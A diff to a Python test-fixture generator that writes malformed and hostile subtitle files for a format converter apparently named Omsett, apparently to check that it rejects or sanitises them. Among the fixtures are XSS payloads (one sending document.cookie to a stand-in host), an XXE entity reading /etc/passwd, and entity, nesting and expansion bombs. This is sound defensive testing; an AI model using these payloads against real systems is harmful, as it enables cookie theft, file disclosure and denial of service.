@@ -1104,6 +1104,484 @@ trap(
     group=G,
 )
 
+# --- subtitles: SRT, WebVTT, ASS, SSA, TTML, LRC, SBV, SAMI, MicroDVD -----------------------------
+# Text again, read by Omsett's own readers. What goes wrong here: times that are not times, a
+# small file that asks to become a large one, markup that hopes to be run somewhere later, one
+# format wearing another's name, and input shaped to make a careless reader take hours over it.
+# Each is converted to SRT (an SRT file, to WebVTT).
+G = "subtitles"
+NOT = "This file is not valid %s"
+NONE = "This file has no subtitles in it"
+BACKWARDS = "A subtitle in this file ends before it starts"
+TOO_MANY = "This file holds more subtitles than Omsett will convert"
+SRT_GOOD = b"1\n00:00:01,000 --> 00:00:04,000\nDrop a file.\n\n2\n00:00:04,500 --> 00:00:07,250\nPick a format.\n"
+
+
+def sub(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+# SRT
+sub(
+    "truncated.srt",
+    SRT_GOOD + b"\n3\n00:00:08,000 --> 00:0",
+    "An SRT file that stops in the middle of a time, as a download cut short does.",
+    "srt", node="fails", note=NOT % "SRT",
+)
+sub(
+    "ends-before-it-starts.srt",
+    b"1\n00:00:09,000 --> 00:00:02,000\nShown for minus seven seconds.\n",
+    "A subtitle whose end comes before its start. Written out as it is, it would never be shown.",
+    "srt", node="fails", note=BACKWARDS,
+)
+sub(
+    "impossible-time.srt",
+    SRT_GOOD + b"\n3\n00:00:08,000 --> 99999999999999999999:75:99,000\nWhen?\n",
+    "A time with twenty digits of hours, seventy-five minutes and ninety-nine seconds.",
+    "srt", node="fails", note=NOT % "SRT",
+)
+sub(
+    "no-words.srt",
+    b"1\n00:00:01,000 --> 00:00:04,000\n\n2\n00:00:04,500 --> 00:00:07,250\n<i></i>\n",
+    "Times with nothing to say at any of them. There is nothing to convert.",
+    "srt", node="fails", note=NONE,
+)
+sub(
+    "script-in-subtitles.srt",
+    b'1\n00:00:01,000 --> 00:00:04,000\n<script>fetch("http://elsewhere.example/"+document.cookie)</script>'
+    b'<img src=x onerror=alert(1)>Hello\n\n2\n00:00:05,000 --> 00:00:06,000\n'
+    b'<a href="javascript:alert(2)">there</a>\n',
+    "Subtitles carrying a script, a picture that runs code when it fails to load, and a link "
+    "that runs code. Tags are not carried across, so none of the three survives as a tag.",
+    "srt", node="succeeds", absent="onerror",
+)
+sub(
+    "tag-inside-a-tag.srt",
+    b"1\n00:00:01,000 --> 00:00:04,000\n<scr<script>ipt>alert(1)</scr</script>ipt>\n",
+    "A tag split in two with another tag in the gap, so that removing tags puts one together. "
+    "What is left is written as text, with its angle brackets spelled out.",
+    "srt", node="succeeds", absent="<script",
+)
+sub(
+    "words-before-any-time.srt",
+    b"1\n00:00:01,000 --> 00:00:04,000\nFine.\n\n2\nNo time here, only words\n\n00:00:05,000 -> 00:00:06,000\nA one-dash arrow.\n",
+    "A subtitle with no time, and one whose arrow is misspelled. Neither can be told from "
+    "words that belong to the subtitle above, so that is what they become.",
+    "srt", node="succeeds",
+)
+sub(
+    "arrow-in-the-wrong-place.srt",
+    b"1\nHello\nthere\n00:00:01,000 --> 00:00:04,000\n",
+    "The time comes after the words it belongs to.",
+    "unknown",
+)
+sub(
+    "picture-named.srt",
+    GOOD,
+    "A PNG with an .srt name.",
+    "png", node="succeeds", mismatch=True,
+)
+sub(
+    "subtitles-named.txt",
+    SRT_GOOD,
+    "Sound SRT subtitles in a file named .txt. Subtitles are known by how they read, so the "
+    "name does not hide them.",
+    "srt", node="succeeds", mismatch=True,
+)
+sub(
+    "latin-1.srt",
+    "1\n00:00:01,000 --> 00:00:04,000\nZoë déjà vu\n".encode("latin-1"),
+    "Subtitles saved in an older encoding. Guessing which would risk garbling every accent.",
+    "unknown",
+)
+sub(
+    "utf-16.srt",
+    b"\xff\xfe" + "1\n00:00:01,000 --> 00:00:04,000\nHello\n".encode("utf-16-le"),
+    "Subtitles saved as UTF-16, two bytes to a letter, which Omsett does not read.",
+    "unknown",
+)
+sub(
+    "nothing-inside.srt",
+    b"",
+    "A file with a subtitle name and no bytes at all.",
+    "unknown",
+)
+sub(
+    "zero-bytes-inside.srt",
+    b"1\n00:00:01,000 --> 00:00:04,000\nHel\x00lo\x00\x00\n",
+    "Subtitles with zero bytes among the words, which no text file holds.",
+    "unknown",
+)
+
+# WebVTT
+VTT_GOOD = b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n"
+sub(
+    "truncated.vtt",
+    VTT_GOOD + b"\n00:00:04.500 --> 00:00:0",
+    "A WebVTT file that stops in the middle of a time.",
+    "vtt", node="fails", note=NOT % "WebVTT",
+)
+sub(
+    "no-heading.vtt",
+    b"00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
+    "WebVTT must open with the word WEBVTT. Without it this reads as SRT, which is what it is "
+    "converted as, and the card says the name and the contents disagree.",
+    "srt", node="succeeds", mismatch=True,
+)
+sub(
+    "almost-the-heading.vtt",
+    b"WEBVTTX\n\n00:00:01.000 --> 00:00:04.000\nDrop a file.\n",
+    "The opening word with one letter too many.",
+    "unknown",
+)
+sub(
+    "ninety-minutes-past.vtt",
+    VTT_GOOD + b"\n00:90:00.000 --> 00:91:00.000\nMinutes stop at fifty-nine.\n",
+    "A time of ninety minutes past the hour.",
+    "vtt", node="fails", note=NOT % "WebVTT",
+)
+sub(
+    "words-with-no-time.vtt",
+    VTT_GOOD + b"\nA paragraph that belongs to no time at all.\n",
+    "A block of words with no time above it. WebVTT does not allow one, and a reader that "
+    "skipped it would be throwing text away without saying so.",
+    "vtt", node="fails", note=NOT % "WebVTT",
+)
+sub(
+    "escaped-twice.vtt",
+    b"WEBVTT\n\n00:00:01.000 --> 00:00:04.000\n&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\n",
+    "A script tag escaped twice over, hoping to be unescaped twice and come out as a tag. It "
+    "is unescaped once, and stays text.",
+    "vtt", node="succeeds", absent="<script",
+)
+sub(
+    "only-notes.vtt",
+    b"WEBVTT\n\nNOTE\n00:00:01.000 --> 00:00:04.000\nThis is inside a note.\n\nSTYLE\n::cue { color: red }\n",
+    "A file whose only subtitle is inside a note, where it is a remark and not a subtitle.",
+    "vtt", node="fails", note=NONE,
+)
+
+# ASS
+ASS_HEAD = (
+    b"[Script Info]\nScriptType: v4.00+\n\n[V4+ Styles]\n"
+    b"Format: Name, Fontname, Fontsize\nStyle: Default,Arial,16\n\n[Events]\n"
+    b"Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
+)
+ASS_LINE = b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Drop a file.\n"
+sub(
+    "truncated.ass",
+    ASS_HEAD + ASS_LINE + b"Dialogue: 0,0:00:04.50,0:00:0",
+    "An ASS file that stops in the middle of a line, before its words.",
+    "ass", node="fails", note=NOT % "ASS",
+)
+sub(
+    "braces-never-closed.ass",
+    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + b"{" * 200_000 + b"\n",
+    "Two hundred thousand opening braces and no closing one. A reader that looks for the "
+    "partner of each would look two hundred thousand times through the same line.",
+    "ass", node="succeeds",
+)
+sub(
+    "no-events.ass",
+    b"[Script Info]\nTitle: Styles and nothing else\nScriptType: v4.00+\n\n[V4+ Styles]\nStyle: Default,Arial,16\n",
+    "A heading and styles, and no section of subtitles.",
+    "ass", node="fails", note=NOT % "ASS",
+)
+sub(
+    "columns-lie.ass",
+    b"[Script Info]\n\n[Events]\nFormat: Text, Start, End\n"
+    b"Dialogue: Hello, said the spider, to the fly,0:00:01.00,0:00:04.00\n",
+    "The file says the words are the first column. They may hold commas, so they can only be "
+    "the last; read as told, the times would be found inside the sentence.",
+    "ass", node="fails", note=NOT % "ASS",
+)
+sub(
+    "a-thousand-columns.ass",
+    b"[Script Info]\n\n[Events]\nFormat: " + b"Layer, " * 1000 + b"Start, End, Text\n"
+    + b"Dialogue: " + b"0," * 1000 + b"0:00:01.00,0:00:04.00,Hello\n",
+    "A line said to have a thousand and three columns.",
+    "ass", node="fails", note=NOT % "ASS",
+)
+sub(
+    "only-drawings.ass",
+    ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,,{\\p1}m 0 0 l 100 0 100 100 0 100\n",
+    "Every line is a drawing, not words. Written as text it would be a row of numbers.",
+    "ass", node="fails", note=NONE,
+)
+sub(
+    "times-are-words.ass",
+    ASS_HEAD + b"Dialogue: 0,yesterday,tomorrow,Default,,0,0,0,,When?\n",
+    "Words where the start and end times belong.",
+    "ass", node="fails", note=NOT % "ASS",
+)
+sub(
+    "heading-only.toml",
+    b"[Script Info]\ntitle = \"x\"\n",
+    "A file with a .toml name that opens with the heading every ASS file opens with. It is "
+    "taken for ASS, found to have no subtitles section, and refused.",
+    "ass", node="fails", note=NOT % "ASS", mismatch=True,
+)
+
+# SSA
+SSA_HEAD = (
+    b"[Script Info]\nScriptType: v4.00\n\n[V4 Styles]\nStyle: Default,Arial,16\n\n[Events]\n"
+    b"Format: Marked, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text\n"
+)
+sub(
+    "truncated.ssa",
+    SSA_HEAD + b"Dialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Fine.\nDialogue: Marked=0,0:00:0",
+    "An SSA file that stops in the middle of a line.",
+    "ssa", node="fails", note=NOT % "SSA",
+)
+sub(
+    "ends-before-it-starts.ssa",
+    SSA_HEAD + b"Dialogue: Marked=0,0:00:09.00,0:00:02.00,Default,,0,0,0,,Backwards.\n",
+    "A line whose end comes before its start.",
+    "ssa", node="fails", note=BACKWARDS,
+)
+sub(
+    "newer-than-it-says.ssa",
+    ASS_HEAD + ASS_LINE,
+    "An ASS file with an .ssa name. The two differ in their headings, and the headings win.",
+    "ass", node="succeeds", mismatch=True,
+)
+sub(
+    "no-columns-named.ssa",
+    b"[Script Info]\nScriptType: v4.00\n\n[Events]\nDialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,,Words, with a comma.\n",
+    "Valid, but the line naming the columns is missing. The usual order is assumed.",
+    "ssa", node="succeeds",
+)
+
+# SBV
+SBV_GOOD = b"0:00:01.000,0:00:04.000\nDrop a file.\n"
+sub(
+    "truncated.sbv",
+    SBV_GOOD + b"\n0:00:04.500,0:00:0",
+    "An SBV file that stops in the middle of a time.",
+    "sbv", node="fails", note=NOT % "SBV",
+)
+sub(
+    "ends-before-it-starts.sbv",
+    b"0:00:09.000,0:00:02.000\nBackwards.\n",
+    "A caption whose end comes before its start.",
+    "sbv", node="fails", note=BACKWARDS,
+)
+sub(
+    "captions-named.csv",
+    SBV_GOOD + b"\n0:00:04.500,0:00:07.250\nPick a format.\n",
+    "SBV captions with a .csv name. The first line has a comma in it, as a table's would, and "
+    "is two times all the same.",
+    "sbv", node="succeeds", mismatch=True,
+)
+sub(
+    "table-named.sbv",
+    b"start,end,words\n1,4,Drop a file\n",
+    "A table with an .sbv name. It does not read as captions, and its name says it is not a "
+    "table.",
+    "unknown",
+)
+
+# LRC
+sub(
+    "truncated.lrc",
+    b"[00:01.00]Drop a file\n[00:04.5",
+    "A lyrics file that stops in the middle of a time.",
+    "lrc", node="fails", note=NOT % "LRC",
+)
+sub(
+    "lyrics-bomb.lrc",
+    b"[0:00]" * 20_000 + b"la " * 700 + b"\n",
+    "One line of lyrics with twenty thousand times in front of it, which asks for the line to "
+    "be written out twenty thousand times: 120 KB that would become 40 MB.",
+    "lrc", node="fails", note=TOO_MANY,
+)
+sub(
+    "times-and-no-words.lrc",
+    b"[00:01.00]\n[00:04.50]\n[00:07.25]<00:08.00>\n",
+    "Times with no lyrics at any of them.",
+    "lrc", node="fails", note=NONE,
+)
+sub(
+    "no-times.lrc",
+    b"[ti:A song]\n[ar:Someone]\n[al:Somewhere]\n",
+    "A title, an artist and an album, and not one timed line.",
+    "unknown",
+)
+sub(
+    "ninety-nine-seconds.lrc",
+    b"[00:99.00]Seconds stop at fifty-nine\n",
+    "A time of ninety-nine seconds past the minute.",
+    "unknown",
+)
+sub(
+    "list-named.lrc",
+    b"[1, 2, 3]\n",
+    "A JSON list with an .lrc name. Both open with a square bracket.",
+    "json", node="succeeds", mismatch=True,
+)
+sub(
+    "words-between-the-lines.lrc",
+    b"[00:01.00]Drop a file\nthis line has no time\n[00:04.50]Pick a format\n",
+    "A line with no time among lines that have one.",
+    "lrc", node="fails", note=NOT % "LRC",
+)
+
+# MicroDVD
+sub(
+    "truncated.sub",
+    b"{25}{100}Drop a file.\n{113}{18",
+    "A MicroDVD file that stops in the middle of a frame number.",
+    "microdvd", node="fails", note=NOT % "MicroDVD",
+)
+sub(
+    "no-frames-a-second.sub",
+    b"{1}{1}0\n{25}{100}Drop a file.\n",
+    "The file says the video plays at no frames a second, which would put every subtitle at "
+    "infinity.",
+    "microdvd", node="fails", note=NOT % "MicroDVD",
+)
+sub(
+    "ends-before-it-starts.sub",
+    b"{100}{25}Backwards.\n",
+    "A subtitle that ends seventy-five frames before it starts.",
+    "microdvd", node="fails", note=BACKWARDS,
+)
+sub(
+    "frame-beyond-counting.sub",
+    b"{25}{100}Drop a file.\n{99999999999999999999}{999999999999999999999}Later.\n",
+    "A frame number of twenty digits: a film some billions of years long.",
+    "microdvd", node="fails", note=NOT % "MicroDVD",
+)
+sub(
+    "object-named.sub",
+    b'{"1": "one", "2": "two"}\n',
+    "A JSON object with a .sub name. Both open with a brace.",
+    "json", node="succeeds", mismatch=True,
+)
+sub(
+    "dvd-subtitles.sub",
+    b"\x00\x00\x01\xba\x44\x00\x04\x00\x04\x01\x01\x89\xc3\xf8" + bytes(range(256)) * 8,
+    "The other kind of .sub file: pictures of subtitles copied from a DVD, not text. There are "
+    "no words in it to convert.",
+    "unregistered",
+)
+
+# TTML
+TT = b'<?xml version="1.0" encoding="UTF-8"?>\n<tt xmlns="http://www.w3.org/ns/ttml">\n<body><div>\n'
+TT_GOOD = b'<p begin="00:00:01.000" end="00:00:04.000">Drop a file.</p>\n'
+TT_END = b"</div></body>\n</tt>\n"
+sub(
+    "truncated.ttml",
+    TT + TT_GOOD + b'<p begin="00:00:04.500" end="00:0',
+    "A TTML file that stops in the middle of a tag.",
+    "ttml", node="fails", note=NOT % "TTML",
+)
+sub(
+    "entity-bomb.ttml",
+    b'<?xml version="1.0"?>\n<!DOCTYPE tt [' + xml_entities + b"]>\n"
+    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&a8;</p></div></body></tt>\n',
+    'The "billion laughs" as a subtitle: one line that stands for a gigabyte of the letter a. '
+    "The shorthand is left as written, not expanded.",
+    "ttml", node="succeeds", absent="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+)
+sub(
+    "reads-a-local-file.ttml",
+    b'<?xml version="1.0"?>\n<!DOCTYPE tt [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n'
+    b'<tt xmlns="http://www.w3.org/ns/ttml"><body><div><p begin="1s" end="2s">&x;</p></div></body></tt>\n',
+    "Asks the reader to fetch a file from the computer and show it as a subtitle. A file that "
+    "names anything outside itself is refused outright.",
+    "ttml", node="fails", note=NOT % "TTML",
+)
+sub(
+    "nested-ten-thousand-deep.ttml",
+    TT + b'<p begin="1s" end="2s">' + b"<span>" * 10_000 + b"deep" + b"</span>" * 10_000 + b"</p>\n" + TT_END,
+    "One subtitle inside ten thousand tags, each inside the last: enough to exhaust a reader "
+    "that goes one level deeper for every tag.",
+    "ttml", node="fails", note=NOT % "TTML",
+)
+sub(
+    "time-is-a-word.ttml",
+    TT + b'<p begin="soon" end="later">When?</p>\n' + TT_END,
+    "Words where the start and end times belong.",
+    "ttml", node="fails", note=NOT % "TTML",
+)
+sub(
+    "no-frames-a-second.ttml",
+    b'<tt xmlns="http://www.w3.org/ns/ttml" xmlns:ttp="http://www.w3.org/ns/ttml#parameter" ttp:frameRate="0">'
+    b'<body><div><p begin="00:00:01:12" end="00:00:02:00">Divided by nothing.</p></div></body></tt>\n',
+    "Times counted in frames, in a file that says there are no frames in a second.",
+    "ttml", node="fails", note=NOT % "TTML",
+)
+sub(
+    "no-times.ttml",
+    TT + b"<p>Never shown.</p>\n<p>Nor this.</p>\n" + TT_END,
+    "Paragraphs with no time on any of them.",
+    "ttml", node="fails", note=NONE,
+)
+sub(
+    "ends-before-it-starts.ttml",
+    TT + b'<p begin="9s" end="2s">Backwards.</p>\n' + TT_END,
+    "A subtitle whose end comes before its start.",
+    "ttml", node="fails", note=BACKWARDS,
+)
+sub(
+    "subtitles-in-a-comment.ttml",
+    b'<?xml version="1.0"?>\n<!-- <tt xmlns="http://www.w3.org/ns/ttml"> -->\n<people><name>Ada</name></people>\n',
+    "Ordinary XML with a .ttml name, and a comment that mentions the tag TTML begins with. A "
+    "comment is not a tag: this is data, and is converted as data.",
+    "xml", node="succeeds", mismatch=True,
+)
+sub(
+    "subtitles-named.xml",
+    TT + TT_GOOD + TT_END,
+    "Sound TTML subtitles with an .xml name. They are XML, and they are subtitles first.",
+    "ttml", node="succeeds", mismatch=True,
+)
+
+# SAMI
+SAMI_GOOD = b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC>Drop a file.\n<SYNC Start=4000><P Class=ENCC>&nbsp;\n"
+sub(
+    "truncated.smi",
+    SAMI_GOOD + b"<SYNC Start=4500><P Class=ENCC>Pick a format.\n<SYNC Start=72",
+    "A SAMI file that stops in the middle of a tag. Nothing in the format marks where it "
+    "should end, so the subtitles that are whole are kept and the broken tag is dropped.",
+    "smi", node="succeeds", absent="SYNC",
+)
+sub(
+    "no-subtitles.smi",
+    b"<SAMI>\n<HEAD><TITLE>Empty</TITLE></HEAD>\n<BODY>\n</BODY>\n</SAMI>\n",
+    "A complete SAMI file with nothing in its body.",
+    "smi", node="fails", note=NONE,
+)
+sub(
+    "script-in-captions.smi",
+    b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC onmouseover=alert(1)>"
+    b"<script>alert(document.cookie)</script><iframe src=//elsewhere.example></iframe>Hello\n"
+    b"<SYNC Start=4000><P Class=ENCC>&nbsp;\n</BODY>\n</SAMI>\n",
+    "SAMI is written like a web page, and this one carries a script, a frame from another "
+    "site, and a paragraph that runs code when pointed at. None is carried across.",
+    "smi", node="succeeds", absent="iframe",
+)
+sub(
+    "comments-never-closed.smi",
+    SAMI_GOOD + b"<!--" * 50_000 + b"\n",
+    "Fifty thousand comments opened and none closed, after the subtitles. Everything from the "
+    "first of them on is a comment.",
+    "smi", node="succeeds", absent="<!--",
+)
+sub(
+    "time-beyond-counting.smi",
+    b"<SAMI>\n<BODY>\n<SYNC Start=99999999999999999999><P>Some billions of years in.\n</BODY>\n</SAMI>\n",
+    "A subtitle said to start at a time twenty digits long.",
+    "smi", node="fails", note=NONE,
+)
+sub(
+    "web-page-named.smi",
+    b"<!DOCTYPE html>\n<html><body><p>Hello</p></body></html>\n",
+    "A web page with a .smi name. SAMI looks like one, and is not one.",
+    "unknown",
+)
+
 with open(os.path.join(OUT, "manifest.json"), "w") as out:
     json.dump(manifest, out, indent=2)
     out.write("\n")
